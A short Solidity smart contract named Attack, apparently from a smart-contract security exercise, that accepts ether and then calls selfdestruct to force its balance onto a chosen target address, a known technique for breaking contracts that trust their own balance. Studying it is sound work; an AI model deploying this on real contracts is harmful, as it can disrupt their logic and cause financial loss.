//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

contract Attack{
    function fundme() external payable{}

    function attack(address payable _address) external{
        selfdestruct(_address);
    }
}